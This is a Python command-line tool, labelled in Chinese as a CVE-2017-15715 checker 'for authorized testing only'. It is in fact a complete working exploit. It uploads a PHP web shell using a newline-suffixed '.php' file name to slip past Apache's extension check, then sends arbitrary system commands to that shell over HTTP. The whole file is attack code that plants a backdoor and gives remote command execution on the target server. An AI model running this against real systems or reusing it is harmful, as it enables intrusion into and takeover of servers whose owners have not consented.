import random
import requests
from urllib.parse import urlparse, urlunparse, parse_qs
from urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from colorama import Fore, Style

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def create_parser():
    """创建并配置参数解析器"""

    parser = argparse.ArgumentParser(
        prog="XingScanner",
        description="CVE-2017-15715 漏洞检测工具",
        epilog=f"{Fore.GREEN}Created by Mahua | 仅限授权测试使用{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    # 必选参数组
    required = parser.add_argument_group(f"{Fore.YELLOW}必选参数{Style.RESET_ALL}")
    required.add_argument("-t", "--target",
                          required=True,
                          help=f"目标URL (示例: {Fore.BLUE}http://target.com/upload.php{Style.RESET_ALL})")

    # 可选参数组
    optional = parser.add_argument_group(f"{Fore.CYAN}可选参数{Style.RESET_ALL}")
    optional.add_argument("-c", "--command",
                          default="whoami",
                          help=f"要执行的系统命令 (默认: {Fore.GREEN}%(default)s{Style.RESET_ALL})")
    optional.add_argument("-o", "--output",
                          type=argparse.FileType('w'),
                          help="结果输出文件路径")
    optional.add_argument("-v", "--verbose",
                          action="count",
                          default=0,
                          help="详细模式 (-v 详细信息, -vv 调试输出)")
    optional.add_argument("-h", "--help",
                          action="store_true",
                          help="显示帮助信息")

    return parser


def precheck_arguments(parser):
    """预处理帮助请求和空参数场景"""

    # 显式帮助请求优先
    if any(arg in sys.argv for arg in ('-h', '--help')):
        parser.print_help()
        sys.exit(0)

    # 空参数场景处理
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)


def CVE_2017_15715(url):
    parsed = urlparse(url)
    target_url = parsed.scheme + "://" + parsed.netloc + parsed.path
    rand_str = ''.join(random.choices('abcdefghijkmnpqrstuvwxyz', k=6))
    webshell_name = rand_str + '.php\x0a'
    webshell_content = "<?php echo system($_POST['cmd']); ?>"

    files = {
        'file': (webshell_name, webshell_content, 'application/octet-stream')
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": target_url,
        "Origin": target_url
    }

    data = {
        'name': webshell_name
    }

    upload_response = requests.post(target_url, files=files, data=data, headers=headers, verify=False)

    if upload_response.status_code == 200:
        print(upload_response.text)
        webshell_path = target_url + webshell_name.strip() + '%0a'
        print(f"[+] Webshell 疑似上传成功: {webshell_path}")
        return webshell_path

def execute_command(webshell_url, command):
    try:
        payload = {'cmd': command}
        command_url = webshell_url
        resp = requests.post(
            command_url,
            data=payload,
            verify=False,
            timeout=10
        )
        print(resp.status_code)
        if resp.status_code == 200:
            print(f"{Fore.GREEN}[+] 命令执行成功: {resp.text.strip()}{Style.RESET_ALL}")
            return True
    except Exception as e:
        print(f"{Fore.RED}[-] 执行失败: {str(e)}{Style.RESET_ALL}")
    return False


def main():
    parser = create_parser()
    precheck_arguments(parser)
    args = parser.parse_args()
    webshell_path = CVE_2017_15715(args.target)
    print('webshell_path:', webshell_path)
    print(f"[*] 尝试执行命令: {args.command}")
    execute_command(webshell_path, args.command)


if __name__ == "__main__":
    main()